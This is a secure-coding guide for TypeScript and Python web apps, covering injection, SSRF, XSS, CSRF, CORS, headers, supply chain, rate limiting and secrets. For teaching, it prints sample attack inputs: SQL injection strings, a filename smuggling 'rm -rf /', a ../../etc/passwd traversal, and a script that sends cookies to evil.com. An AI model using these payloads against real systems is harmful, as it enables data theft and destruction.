# Security

> **Calibrate the investment, not the core rules.** The core defences — authorizing
> every request, parameterized queries, escaping user content, real password hashing,
> secrets out of git — hold at
> any app size: an attack doesn't care how few users you have, and the safe way is
> usually the same amount of code as the vulnerable way. What scales with exposure is
> the machinery *around* them: how elaborate your CSP gets, formal rotation schedules,
> rate limiting. Judgment here means sizing that investment — never skipping a core
> defence because the app is small.

## The Problem

Security isn't a feature you add — it's a property your system either has or doesn't. Most security vulnerabilities aren't sophisticated hacking. They're ordinary mistakes: a developer concatenates user input into a SQL query, forgets to escape HTML output, or commits an API key to git.

The OWASP (Open Web Application Security Project) Top 10 is the industry-standard list of the most critical web application security risks, updated every few years from real-world attack data. When a security auditor reviews your app, this is their starting checklist. This topic covers the attacks most relevant to the TypeScript/Python web apps you'll be building.

---

## Access Control

Broken Access Control is A01 in the OWASP Top 10:2025, so every review checks it. [Authentication & Authorization](./authentication-authorization.md) is the full treatment; these rules hold at any size:

- Take identity, and the tenant, from the verified session, never from the request body, the URL or a client-controlled header ([Multi-Tenant Isolation](./multi-tenant-isolation.md)).
- Authorize the specific resource *and* the action on the server, on every request. A hidden button is not a control.
- Refuse with 403, or with 404 where confirming that the resource exists would itself leak (another tenant's record), as the API's policy says.
- A function that runs with more privilege than its caller (a definer function, a service account, an admin endpoint) verifies the caller's right to the scope it was asked for.

---

## Injection Attacks

An attacker sends malicious data that gets interpreted as code by your system.

### SQL Injection

The most well-known attack. User input is concatenated directly into a SQL query:

```python
# VULNERABLE: user input becomes part of the SQL command
query = f"SELECT * FROM users WHERE email = '{user_input}'"

# If user_input is: ' OR '1'='1
# Query becomes: SELECT * FROM users WHERE email = '' OR '1'='1'
# This returns ALL users — the attacker dumped your user table

# Even worse: user_input is: '; DROP TABLE users; --
# Query becomes: SELECT * FROM users WHERE email = ''; DROP TABLE users; --'
# Your users table is gone
```

**Prevention: parameterized queries (prepared statements).** The database treats the parameter as data, never as SQL code:

```python
# SAFE: parameter is data, not SQL
cursor.execute("SELECT * FROM users WHERE email = %s", (user_input,))
```

```typescript
// SAFE: parameterized query
const user = await db.query('SELECT * FROM users WHERE email = $1', [userInput]);
```

**ORMs (SQLAlchemy, Prisma, Drizzle) use parameterized queries by default.** Their raw-SQL escape hatches are where injection comes back: Prisma's `prisma.$queryRawUnsafe` / `$executeRawUnsafe` and `Prisma.raw()`, Drizzle's `sql.raw()`, and SQLAlchemy's `text(f"...")` all splice strings into the SQL. The tagged-template forms are safe — Prisma's `` prisma.$queryRaw`...${email}` `` and Drizzle's `` sql`...${email}` `` bind each interpolated value — as is `text()` with bound `:name` parameters. If you must write raw SQL, always use the parameterized form. **Identifiers can't be bound:** a column in `ORDER BY` or a table name cannot be a parameter, so map user input through an allowlist of known names rather than interpolating it.

### NoSQL Injection

Same concept, different database:

```python
# VULNERABLE: if user_input is a dict like {"$ne": null}, this matches ALL users
db.users.find({"email": user_input})
```

**Prevention:** Validate input types with your schema (Pydantic/Zod) before using it in queries. If `email` should be a string, Pydantic rejects a dict. This is where [Data Integrity](./data-integrity.md) and security intersect — schema validation at boundaries is a security defence.

### Command Injection

User input ends up in a shell command:

```python
# VULNERABLE
os.system(f"convert {user_filename} output.png")
# user_filename = "image.png; rm -rf /"
# Executes: convert image.png; rm -rf /
```

**Prevention:** Never pass user input to shell commands. Use library APIs instead. If you must use a subprocess, use array syntax and never `shell=True`:

```python
# SAFE: arguments are a list, not interpolated into a string
subprocess.run(["convert", user_filename, "output.png"], check=True)
# Even if user_filename contains special characters, they're treated as a filename
```

```typescript
// SAFE: arguments are an array
import { execFile } from 'child_process';
execFile('convert', [userFilename, 'output.png'], callback);
// NOT execSync(`convert ${userFilename} output.png`) — that's vulnerable
```

---

## SSRF and Path Traversal

Both happen when user input chooses *where* the server reads from or connects to.

**Server-side request forgery (SSRF):** your server fetches a URL a user supplied (a webhook target, a link preview, an image import, a tool a language model can call), and the attacker points it at something only the server can reach: an internal service, an admin port, or the cloud metadata endpoint that hands out credentials. OWASP's Top 10:2025 files it under A01, Broken Access Control.

- Allowlist destinations (scheme, host, port) where you can. Where you cannot, accept only addresses your IP library reports as globally routable (Python `ipaddress` `is_global`, after unwrapping IPv4-mapped IPv6), which also rejects `0.0.0.0/8`, `100.64.0.0/10` and the metadata endpoints (`169.254.169.254`, ECS `169.254.170.2`, IPv6 `fd00:ec2::254`). Refuse NAT64's `64:ff9b::/96` yourself: it reports as global, yet in an IPv6-only VPC it reaches private IPv4.
- Check the address the connection actually uses: a validating `lookup` on the HTTP agent in Node (undici's `connect` options for `fetch`), which must check every address it returns, since Node asks for all of them (`all: true`) by default, or an egress proxy such as Stripe's Smokescreen for every user-chosen URL. Checking the hostname and letting the client resolve it again loses to DNS rebinding, where the second lookup returns an internal address, and rewriting the URL to the checked IP breaks TLS certificate checks.
- Turn automatic redirects off, or re-check every hop: a redirect is a new destination. `fetch`, axios and `requests` follow redirects by default; `httpx` does not.
- On AWS, require IMDSv2 on EC2 instances, so a forged plain `GET` cannot read instance credentials. It is a backstop, not the fix.

**Path traversal:** user input becomes part of a file path (`../../etc/passwd`) on an upload, a download or an archive extract. Store uploads under a server-generated name (a UUID) and keep the user's filename only as metadata. Where a path must come from input, resolve it and confirm it still lies inside the intended base directory before opening it; check every entry of an uploaded archive the same way ("zip slip"). Compare whole path segments, not strings: Python `Path(p).resolve().is_relative_to(base.resolve())`; Node `path.relative(base, target)` must be neither absolute nor `..`-led. Python's `zipfile` strips `..` itself, but `tarfile` filters only from 3.14, so pass `filter='data'` on earlier versions.

---

## XSS (Cross-Site Scripting)

An attacker injects JavaScript into your page that runs in other users' browsers.

### How It Works

Your app has a comments feature. An attacker posts:

```html
<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
```

If your app renders this without sanitizing, every user who views the page runs the attacker's JavaScript. The script sends their session cookie to the attacker, who can now impersonate them.

### Types

- **Stored XSS** — malicious script saved in your database (the comment example). Most dangerous — affects every user who views the page.
- **Reflected XSS** — malicious script in the URL: `yourapp.com/search?q=<script>...</script>`. Server includes the search term in the page without escaping.
- **DOM-based XSS** — Client-side JavaScript reads from `window.location` or `document.referrer` and inserts it into the DOM unsanitized.

### Prevention

**React escapes by default** — `{variable}` in JSX converts `<script>` to harmless text `&lt;script&gt;`:

```tsx
// SAFE: React auto-escapes — script tags become visible text, not executable code
<p>{comment.text}</p>

// DANGEROUS: dangerouslySetInnerHTML bypasses escaping — never use with user content
<p dangerouslySetInnerHTML={{ __html: comment.text }} />
```

**Server-rendered HTML (Jinja2, etc.):**

```python
# Jinja2 3 — Flask 3 and Starlette 1's Jinja2Templates escape by extension: .html, .htm, .xml (Flask adds .xhtml, .svg)
# A .j2/.jinja/.txt template, your own env=, or a raw jinja2.Environment() is NOT escaped: pass autoescape=True (a classic trap in email templates)
# {{ user_input }} — auto-escaped (safe)
# {{ user_input | safe }} — DISABLES escaping (dangerous with user content)
```

**Rendering user HTML on purpose** (rich-text editor output, Markdown converted to HTML) is the one real case for `dangerouslySetInnerHTML`, and then only on DOMPurify's output, never the raw string. DOMPurify keeps the formatting and drops scripts, event-handler attributes and `javascript:` URLs; never hand-roll the sanitizer with regular expressions.

**Additional protection:** a strict Content-Security-Policy (see below) stops injected scripts from running even when one gets through.

---

## CSRF (Cross-Site Request Forgery)

An attacker's page makes a logged-in user's browser send a request to your app, such as a hidden form that auto-submits `POST /transfer`. The browser attaches your session cookie automatically, so the request arrives authenticated, and the user never clicked anything. CSRF is a cookie problem: an API authenticated by an `Authorization: Bearer` header is not exposed, because the attacker's page cannot attach the token.

### Prevention

In this order (OWASP CSRF Prevention Cheat Sheet):

1. **Use the framework's built-in protection** where it has one.
2. **Then either Fetch Metadata or tokens.** They are alternatives, not a primary and a fallback.
   - **Fetch Metadata**, where you serve only modern browsers: reject a state-changing request whose `Sec-Fetch-Site` header is not `same-origin`. The fallback is mandatory: when the header is absent, require `Origin` to equal your own origin, and reject when both are absent.
   - **Tokens:** a synchronizer token kept in the session for a stateful app, or a signed double-submit cookie for a stateless one. Never the unsigned double-submit variant, which anyone able to write a cookie from a sibling subdomain defeats.
3. **`SameSite` and `__Host-` cookies as defence in depth**, never as the defence. `SameSite` is scoped to the registrable domain, so a sibling subdomain counts as same-site, and `Lax` still sends the cookie on top-level `GET` navigations.
4. **Never change state on `GET`.** Every defence above assumes safe methods are safe.

```typescript
// Express 5 — Fetch Metadata check with the mandatory Origin fallback
app.use((req, res, next) => {
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next(); // safe methods change nothing
  const site = req.get('Sec-Fetch-Site');
  const allowed = site ? site === 'same-origin' : req.get('Origin') === APP_ORIGIN; // neither header: reject
  return allowed ? next() : res.status(403).end();
});
```

Non-browser clients send neither header, so mount the check on cookie-authenticated routes only. Allow `same-site` as well only if you trust every sibling subdomain.

**Session cookies** are `Secure`, `HttpOnly`, `Path=/`, no `Domain`, with the `__Host-` prefix. Use `SameSite=Strict` for a BFF whose pages work before the session is read (RFC 10017 recommends it), and `Lax` where a server-rendered page must recognise a user who follows a link from another site. The browser accepts a `__Host-` cookie only with `Secure`, `Path=/` and no `Domain`, so a sibling subdomain cannot plant or overwrite it, which defeats session fixation and cookie tossing. It does not stop a sibling's page sending a same-site request that carries the cookie; only the `same-origin` check or a token stops that.

**Framework support:**
- **FastAPI:** No built-in CSRF protection. Bearer-token auth doesn't need it; a FastAPI app that authenticates with cookie sessions does, and must add its own
- **Next.js:** Server Actions are POST-only and reject requests whose `Origin` doesn't match `Host`; Route Handlers get no CSRF protection, so a cookie-authenticated Route Handler needs its own
- **Express:** No built-in protection. Add the check above, or `csrf-csrf` for signed double-submit tokens (`csurf` is deprecated)

---

## CORS (Cross-Origin Resource Sharing)

A browser mechanism that controls which websites can read your API's responses.

By default, JavaScript on `frontend.com` cannot *read* a response from `api.com`: the browser withholds it. CORS headers tell the browser which origins may read responses (and, after a preflight, send non-simple requests). Simple requests — a form-style POST — are still *sent* and processed, so CORS is not CSRF protection.

### Configuration

```typescript
// cors 2 (Express)
// Fine only for a public or bearer-token API: browsers refuse `*` on credentialed requests
app.use(cors({ origin: '*' }));

// DANGEROUS: reflects whatever origin the request came from AND allows cookies —
// any website can read your logged-in users' responses
app.use(cors({ origin: true, credentials: true }));

// SAFE: explicitly list allowed origins
app.use(cors({
  origin: ['https://myapp.com', 'https://staging.myapp.com'],
  credentials: true,
}));
```

```python
from fastapi.middleware.cors import CORSMiddleware

app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://myapp.com", "https://staging.myapp.com"],
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE"],
    allow_headers=["*"],
)
```

**When `*` is OK:** For public APIs, and for APIs authenticated by a bearer token in a header (not ones that trust cookies or network location). Browsers refuse a literal `*` on credentialed requests, and an attacker's page has no bearer token to send, so `*` alone lets no one make authenticated requests. **The real hole is any origin *plus* credentials:** reflecting the request's origin with credentials (`origin: true`), a loose regex or suffix match (`/myapp\.com$/` also matches `evilmyapp.com`), allowing the `null` origin (sent by sandboxed iframes and local files), or Starlette/FastAPI `allow_origins=["*"]` with `allow_credentials=True`, which echoes the caller's origin instead of sending `*`. Each lets any website read responses to your users' cookie-authenticated requests.

**Development:** You'll often need `http://localhost:3000` in your CORS origins during development. Make sure this doesn't leak into production config — use environment-specific CORS origins via your [Configuration](./configuration.md) setup.

### Preflight Requests (OPTIONS)

When the browser makes certain cross-origin requests, it first sends an OPTIONS request to ask "is this allowed?" before sending the actual request. This is called a **preflight**.

**What triggers a preflight:**
- Custom headers (e.g., `Authorization: Bearer ...`)
- HTTP methods other than GET, HEAD, or POST
- POST with a content type other than `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain` (so `application/json` triggers a preflight)

Since most API calls use `Authorization` headers and `Content-Type: application/json`, **almost every API request triggers a preflight.**

The browser sends the real request only if the `OPTIONS` response carries CORS headers that allow it. A server that doesn't answer `OPTIONS` correctly never sees the real request, and the console shows a cryptic CORS error.

**Most CORS middleware handles this automatically.** The `cors()` middleware in Express and `CORSMiddleware` in FastAPI both respond to OPTIONS requests correctly. The common mistake is adding CORS headers manually to your routes but forgetting to handle OPTIONS — use the middleware instead.

---

## Security Headers

HTTP headers that tell browsers to enable security features. In Node.js, one package adds sensible defaults:

### Node.js / Express — helmet

```typescript
import helmet from 'helmet';
app.use(helmet());
// Adds ~15 security headers with sensible defaults in one line
```

### FastAPI / Python

```python
@app.middleware("http")
async def security_headers(request, call_next):
    response = await call_next(request)
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    response.headers["X-XSS-Protection"] = "0"  # disabled — CSP is the modern replacement
    return response
```

The manual `X-XSS-Protection: 0` mirrors what `helmet` sets by default — the header is deliberately *off* because the legacy browser XSS auditor it enabled was itself buggy and has been removed from modern browsers; CSP is the real protection.

### Key Headers

| Header | What it does | Why it matters |
|--------|-------------|----------------|
| `Strict-Transport-Security` | Forces HTTPS for all future requests | Prevents HTTP downgrade attacks |
| `Content-Security-Policy` | Controls what scripts/styles/images can load | Blocks XSS by preventing inline scripts and unauthorized sources |
| `X-Content-Type-Options: nosniff` | Prevents browsers from guessing content types | Stops browsers interpreting a text file as JavaScript |
| `X-Frame-Options: DENY` | Prevents your page from being embedded in an iframe | Prevents clickjacking attacks. Superseded by CSP `frame-ancestors 'none'`; send both for older browsers |
| `Referrer-Policy` | Controls what URL info is sent to external sites | Prevents leaking sensitive URL paths |

### Content-Security-Policy (CSP)

The most powerful and most complex security header. Prefer a **strict, nonce-based policy** to an allowlist of hosts: an allowlist is easy to bypass through scripts already hosted on the domains it trusts. The policy is `script-src 'nonce-{random}' 'strict-dynamic'; object-src 'none'; base-uri 'none'`. The server generates a fresh random nonce for every response and puts it on each `<script>` it emits. An injected script has no nonce, so it doesn't run, and `'strict-dynamic'` lets the trusted scripts load their own dependencies.

- **Next.js:** a nonce makes every page dynamically rendered (no static generation, Incremental Static Regeneration or Partial Prerendering); a static site uses Next's experimental Subresource Integrity (`experimental.sri`) instead.
- **Roll out in report-only first.** Send `Content-Security-Policy-Report-Only`, review the violation reports, then enforce.
- **Trusted Types** (`require-trusted-types-for 'script'`) makes DOM sinks such as `innerHTML` refuse plain strings. It is optional hardening for large client-side apps, not a core control.

---

## Passwords

Store passwords with **Argon2id**, never a fast hash (plain text, MD5, SHA-256); bcrypt at cost 10 or more is for legacy systems only, and it cannot use more than 72 bytes of input ([Pitfalls](./pitfalls.md#the-72-byte-password)). Parameters, password policy and MFA are in [Authentication & Authorization](./authentication-authorization.md#passwords--mfa).

---

## Supply Chain

A dependency runs with your app's privileges, so adding or updating one is a trust decision. [Deployment](./deployment.md#dependency-management) owns lockfiles, reproducible installs, update cadence, vulnerability scanning and the [install-time settings](./deployment.md#install-time-supply-chain-controls) that enforce this policy; this section owns what you trust:

- **Wait before adopting a new release.** The 2025 hijacks were caught within hours: the malicious `chalk` and `debug` releases of 8 September were live about two hours yet reached one cloud environment in ten, and the Shai-Hulud 2.0 worm of 24 November backdoored 796 packages, each compromised for several hours. A release-age delay of a few days would have skipped them; download counts would not, because the hijacked package is the popular one.
- **Don't run install scripts by default.** A `postinstall` hook runs arbitrary code on every developer machine and CI runner that installs the package. Allow scripts only for the packages that need them (pnpm has blocked dependency scripts by default since version 10, and npm since version 12, though npm skips an unapproved script instead of failing the install).
- **Check the package is the one you meant.** Typosquats (`lodsah` for `lodash`) and slopsquats (names an AI assistant invents, which attackers then register) both rely on nobody looking. Read the registry page before adding a name you have not used before, especially one an agent suggested.

---

## Rate Limiting

Rate limiting restricts how many requests a client can make in a time window. It's the one defence in this chapter that genuinely scales with exposure: an internal tool on a private network with a handful of known users has nobody to rate-limit. It earns its keep when your API is publicly reachable, has unauthenticated endpoints (login and signup get brute-forced), or calls paid services downstream.

### When You Need It

- **Abuse prevention** — stops bots from brute-forcing login, scraping data, or flooding your API
- **Fair usage** — prevents one heavy user from degrading the service for everyone else
- **Cost protection** — if your API calls paid services (AI models, payment processors), an unrestricted client can run up your bill
- **DDoS mitigation** — rate limiting alone doesn't stop a distributed attack, but it reduces the impact

### Common Strategies

**Per-user / per-API-key:** "100 requests per minute per authenticated user." The most common approach. Identified users or API keys get individual limits.

**Per-IP:** "50 requests per minute per IP address." Useful for unauthenticated endpoints (login, signup). Less reliable because many users can share an IP (corporate NATs, VPNs).

**Per-endpoint:** Different limits for different endpoints. A search endpoint might allow 60/min, while a payment endpoint might allow 10/min.

### Implementation

Most frameworks have rate limiting middleware or libraries. You don't implement the algorithm yourself.

**Express (TypeScript):**
```typescript
// express-rate-limit 8 — limit replaced max; IPv6 clients are keyed by subnet (ipv6Subnet, default 56)
import rateLimit from 'express-rate-limit';
import { AppError } from './errors'; // Error Handling's hierarchy

class RateLimitedError extends AppError {
  readonly code = 'RATE_LIMITED';
  constructor() { super('Too many requests', 429); }
}

const limiter = rateLimit({
  windowMs: 60 * 1000,    // 1-minute window
  limit: 100,              // 100 requests per window per IP
  standardHeaders: true,   // Return rate limit info in `RateLimit-*` headers
  // Refuse through the global error handler, so the 429 gets the same problem+json body,
  // request id included, as every other error (Retry-After is already set by then)
  handler: (req, res, next) => next(new RateLimitedError()),
});

app.use('/api/', limiter);
```

**FastAPI (Python):**
```python
from slowapi import Limiter
from slowapi.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)
app.state.limiter = limiter

@app.get("/api/search")
@limiter.limit("60/minute")
async def search(request: Request, query: str):
    ...
```

**Behind a load balancer, key on the real client IP** through trusted-proxy configuration, and keep the counters in a store shared by every replica, such as Redis; [Pitfalls](./pitfalls.md#when-building-backend-or-pipeline-code) has the detail.

### The 429 Response

When a client exceeds the rate limit, return HTTP 429 (Too Many Requests) with a `Retry-After` header telling the client when to try again (the `RateLimit-*` lines follow the shape of IETF draft-ietf-httpapi-ratelimit-headers-06):

```
HTTP/1.1 429 Too Many Requests
Retry-After: 30
RateLimit-Limit: 100
RateLimit-Remaining: 0
RateLimit-Reset: 30
```

`Retry-After` is the standard to lean on. The `RateLimit-*` headers are still an IETF draft that keeps changing — `RateLimit-Reset` is delta-seconds, not an epoch timestamp, and later revisions merge the three into `RateLimit` and `RateLimit-Policy` — so treat them as informational.

This connects to [Resilience](./resilience.md) — well-behaved clients read the `Retry-After` header and wait before retrying.

---

## Secrets Management

This section owns where secrets are stored, how they rotate and what they can reach. [Configuration](./configuration.md#secret-delivery-and-rotation) owns how a secret reaches the process, and when the app sees a rotated value.

- **Never commit secrets to git.** Turn on secret scanning with push protection, which refuses a push containing a recognized credential. GitHub runs it free on public repositories; private organization repositories need GitHub Secret Protection.
- **Rotate a leaked secret first.** Bots find keys pushed to GitHub within minutes, so revoke and reissue the key before anything else. Rewriting git history afterwards tidies the repository but un-leaks nothing, because clones, forks and caches already hold it.
- **Prefer credentials that expire on their own.** Federated, short-lived credentials (OIDC roles for CI, IAM roles for workloads) leave no long-lived key to leak or rotate. Keep any static key that remains in a secret manager (AWS Secrets Manager, Vault) on a rotation schedule, not in environment variables typed onto servers.
- **Least privilege.** Each key gets the minimum it needs: a read-only key can't write, and one service's key can't reach another service's resources.
- **Never log secrets.** Scrub config objects and auth headers before they reach a log ([Logging](./logging.md)).

---

## Testing Security

Security is the concern where a passing test most easily lies, because the dangerous behaviour is a *missing* check that nothing exercises. The discipline is to prove the negative — assert the attack is refused, against a live request path rather than the function you hope is wired in:

- **Authentication gate.** An unauthenticated request to a protected route must be rejected (401), proving the gate is actually in front of the route.
- **Authorization (ownership).** An authenticated caller asking for a resource they don't own must be refused (403, or 404 if your API hides existence — assert whichever its policy says) — this catches the classic authenticated-but-not-authorized mistake. It must hit the server: a hidden button is not a control, so a test that only checks the UI proves nothing.
- **Injection held.** Drive a hostile payload through the real endpoint and assert two things — it's handled safely (rejected or empty results, never a 500 leaking a database error) *and* an oracle you can read back shows the query held: `' OR '1'='1` returns no extra rows, and a stored payload round-trips as the literal string. The read-back is the real assertion: it proves parameterized queries held, which a function-level mock can't demonstrate. Don't use "the table survives `'; DROP TABLE ...; --`" as the oracle: tests run as the unprivileged runtime role, which can't DROP anyway, so it passes even when the query is injectable.
- **No leakage to an attacker.** An error response must not leak source-file paths (`.ts:`/`.py:`) or other implementation detail. (The broader "unknown error becomes a safe 500 with no stack trace" guarantee is [Error Handling](./error-handling.md)'s to verify — reference it rather than re-asserting it here.)

These hit a real request path and a real database engine, not mocks — see [Testing](./testing.md) for the real-database setup and the request/handler harness.

---

## Anti-Patterns

| Don't | Do Instead | Why |
|-------|-----------|-----|
| Concatenate user input into SQL/commands | Use parameterized queries and array-based subprocess calls | Injection — A05 in the OWASP Top 10:2025 (Broken Access Control is A01) |
| Use `dangerouslySetInnerHTML` with user content | Let React/template engine auto-escape; sanitize with DOMPurify when you must render user HTML | XSS — attacker runs JS in your users' browsers |
| Rely on `SameSite` alone against CSRF, or change state on `GET` | Framework protection, then Fetch Metadata with the `Origin` fallback or tokens; `SameSite` on top | `SameSite` treats sibling subdomains as same-site, and `Lax` still sends cookies on top-level `GET`s |
| Fetch a user-supplied URL from the server as given | Allowlist destinations, or accept only globally routable addresses, checked on the address the connection uses | SSRF reaches internal services and cloud credentials |
| Allow any origin *with credentials* (`origin: true`, or Starlette `allow_origins=["*"]` + `allow_credentials=True`) | Explicitly list allowed origins, compared exactly | Any website can read responses to your users' cookie-authenticated requests |
| Skip security headers | Use `helmet` (Node.js) or set headers in middleware | Missing headers leave browser protections disabled |
| Store passwords as plain text or MD5/SHA256 | Use Argon2id; bcrypt at cost 10 or more on legacy systems only | Weak hashing means stolen databases are cracked in minutes |
| Check authentication but not authorization | Always verify the user has permission for the specific resource and action | Authenticated doesn't mean authorized — user A shouldn't access user B's data |
| Commit `.env` files to git | Add to `.gitignore`, use `.env.example` for documentation; turn on push protection | Secrets in git history are exploited by automated scanners |
| Rewrite git history to clean up a leaked key | Rotate the key first | Clones, forks and caches already hold it |
| Add whatever package an assistant suggests, at its newest release | Confirm it is the package you meant, and wait out a release-age delay | Slopsquats and hijacked releases rely on nobody looking |
| Use `shell=True` in subprocess calls (Python) | Use array syntax: `subprocess.run(["cmd", arg1, arg2])` | `shell=True` enables command injection |
| Return detailed error messages to clients in production | Return generic messages, log details server-side | Stack traces and SQL errors leak internal details to attackers |

---

## Deciding for Your Project

The core defences (parameterized queries, escaping, access control, real password hashing, secrets out of git) are not decisions. These are:

1. **How does the browser authenticate?** A backend-for-frontend with a `__Host-` session cookie where the app has a backend; a bearer token in a header for a browser-only SPA or a machine client. A cookie brings CSRF; [Authentication & Authorization](./authentication-authorization.md) has the token-storage tradeoff.
2. **Which CSRF defence?** The framework's own where it has one; otherwise Fetch Metadata with the `Origin` fallback, or tokens; `SameSite` and `__Host-` on top either way.
3. **How strict is the CSP?** A nonce-based strict policy for dynamically rendered pages, hashes for static ones, an allowlist only as a stopgap. Start in report-only.
4. **Does the server fetch URLs a user chose?** Then settle the destination allowlist, or the globally routable check and where it runs (a validating lookup or an egress proxy), before the feature ships.
5. **Where does rate limiting live, and on what store?** The gateway or edge for blunt per-IP limits; the app for per-user and per-endpoint limits, with a shared store once there is more than one replica.
6. **What is your dependency policy?** How long a new release waits before you adopt it, whether install scripts run, and who approves a new package.
7. **Which credentials can be short-lived?** Federate CI and workload credentials; store the static keys that remain in a secret manager with a rotation schedule.

---

## Related Topics

- **Input validation** — see [Data Integrity](./data-integrity.md) for schema validation at boundaries, which narrows what reaches a query; parameterized queries and output escaping remain the primary defence against injection
- **Error responses and information leakage** — see [Error Handling](./error-handling.md) for why you must never expose stack traces or internal error details
- **How secrets reach the app** — see [Configuration](./configuration.md#secret-delivery-and-rotation) for platform injection versus a runtime fetch, and when a rotated value is seen
- **Lockfiles, vulnerability scanning and install-time settings** — see [Deployment](./deployment.md#dependency-management), including the [install-time supply-chain controls](./deployment.md#install-time-supply-chain-controls) that enforce this chapter's trust policy
- **Secrets and personal data in logs** — see [Logging](./logging.md#dont-log) for what never to log, scrubbing, retention, and restricting who can read a log store
- **Multi-tenant isolation** — see [Multi-Tenant Isolation](./multi-tenant-isolation.md) for tenant scoping, the RLS backstop, and cross-tenant access paths
- **Authorization models, sessions, token storage, JWT verification and passwords** — see [Authentication & Authorization](./authentication-authorization.md), the canonical reference
- **Testing security** — see [Testing](./testing.md) for the real-database setup the authn/authz, injection, and information-leakage tests need
